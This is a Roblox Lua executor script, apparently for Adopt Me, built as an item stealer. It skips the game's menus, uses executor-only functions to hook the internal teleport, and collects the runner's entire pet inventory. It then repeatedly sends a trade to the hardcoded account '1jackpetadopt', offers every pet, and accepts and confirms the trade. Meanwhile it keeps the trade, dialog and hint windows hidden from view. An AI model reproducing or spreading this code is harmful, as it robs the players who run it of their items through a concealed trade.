local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")

local Player = Players.LocalPlayer
local wait = task.wait
local nickname = "1jackpetadopt"


Player.Idled:connect(
    function()
        VirtualUser:ClickButton2(Vector2.new())
    end
)

for i,v in pairs(getconnections(Player.Idled)) do
    v:Disable()
end

repeat wait() until Player.PlayerGui:FindFirstChild("PlayButton",true)

RunService.Stepped:Connect(function()
    pcall(function()
        if Player.PlayerGui:FindFirstChild("NewsApp",true).Enabled then
            for i,v in pairs(getconnections(Player.PlayerGui:FindFirstChild("PlayButton",true).MouseButton1Click)) do
                v.Function()
            end
        end
        if Player.PlayerGui:FindFirstChild("ChooseParent",true) then
            for i,v in pairs(getconnections(Player.PlayerGui:FindFirstChild("ChooseParent",true).MouseButton1Click)) do
                v.Function()
            end
        end
        if Workspace:FindFirstChild("ServerSidedMapSeats") then
            Workspace.ServerSidedMapSeats:Destroy()
        end
    end)
end)

game:GetService("RunService"):Set3dRenderingEnabled(false)

wait(5)


function tp()
    local L
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local get_thread_identity = get_thread_context or getthreadcontext or getidentity or syn.get_thread_identity
    local set_thread_identity = set_thread_context or setthreadcontext or setidentity or syn.set_thread_identity
    for i, v in pairs(getgc()) do
        if type(v) == "function" then
            if getfenv(v).script == ReplicatedStorage.ClientModules.Core.InteriorsM.InteriorsM then
                if table.find(getconstants(v), "LocationAPI/SetLocation") then
                    L = v
                    break
                end
            end
        end
    end
    getgenv().Location = function(A, B, C)
        local O = get_thread_identity()
        set_thread_identity(2)
        L(A, B, C)
        set_thread_identity(O)
        return A, B, C
    end
    Location("MainMap", "Default", {})
    game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart",true).CFrame = game:GetService("Workspace"):FindFirstChild("Neighborhood/MainDoor",true):GetModelCFrame():ToWorldSpace(CFrame.new(470, 10, -399)) -- Teleporting Part
end

tp()

spawn(function()
    while true do
        wait(0.03)
        Player.PlayerGui.DialogApp.Dialog.Visible = false
        Player.PlayerGui.TradeApp.Frame.Visible = false
        Player.PlayerGui.HintApp.TextLabel.Visible = false
    end
end)

for i, v in pairs(debug.getupvalue(require(game:GetService("ReplicatedStorage").Fsys).load("RouterClient").init, 4)) do
    v.Name = i
end

for i,v in pairs(Players:GetPlayers()) do
    if v.Name == (nickname) or v.Name:find(nickname) or v.DisplayName == nickname or v.DisplayName:find(nickname) then
       Playt = v
    end 
end


local petslist = {}

for i,v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets) do
    table.insert(petslist, v.unique)
end

while true do
    pcall(function()  
    ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
    end)
    wait(5)

    for i, v in pairs(petslist) do
        ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v)
    end

    if Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Visible == true then
        if string.match(tostring(Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept.Face.Colors.Base.ImageColor3), "0.776471") then
            ReplicatedStorage.API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
            wait(1)
        end
    end
    if Player.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible == true then
        if string.match(tostring(Player.PlayerGui.TradeApp.Frame.ConfirmationFrame.Accept.Face.Colors.Base.ImageColor3), "0.776471") then
            ReplicatedStorage.API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
        end
    end
end
